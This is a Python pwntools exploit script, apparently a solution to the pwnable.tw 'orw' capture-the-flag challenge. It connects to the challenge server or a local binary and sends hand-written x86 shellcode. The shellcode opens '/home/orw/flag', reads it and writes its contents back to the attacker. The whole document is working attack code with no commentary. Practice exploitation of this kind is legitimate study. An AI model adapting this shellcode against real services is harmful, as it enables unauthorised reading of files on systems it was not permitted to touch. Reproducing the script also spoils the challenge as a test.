# -*- coding: utf-8 -*-
# @Author: resery
# @Date:   2020-10-22 08:49:28
# @Last Modified by:   resery
# @Last Modified time: 2020-10-22 09:14:25
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level="debug"

if sys.argv[1]=="debug":
	sh = process("./orw")
elif sys.argv[1]=="remote":
	sh = remote("chall.pwnable.tw",10001)

elf = ELF("./orw")

ru = lambda x:sh.recvuntil(x)
rv = lambda x:sh.recv(x)
ra = lambda x:sh.recvall(x)
sl = lambda x:sh.sendline(x)
sd = lambda x:sh.send(x) 
sla = lambda x,y:sh.sendlineafter(x,y)
lg = lambda x:log.success(x)

def dbg():
	gdb.attach(sh)

ru(":")

shellcode = asm(
	'''
	xor eax,eax
	push 0x006761
	push 0x6c662f77
	push 0x726f2f65
	push 0x6d6f682f
	mov ebx,esp
	xor ecx,ecx
	xor edx,edx
	mov eax,5
	int 0x80

	mov ebx,eax
	mov ecx,esp
	mov edx,0x30
	xor eax,eax
	mov eax,3
	int 0x80

	xor ebx,ebx
	mov ebx,1
	mov ecx,esp
	xor eax,eax
	mov eax,4
	int 0x80

	xor eax,eax
	mov ebx,1
	mov eax,1
	int 0x80
	''')

sl(shellcode)


sh.interactive()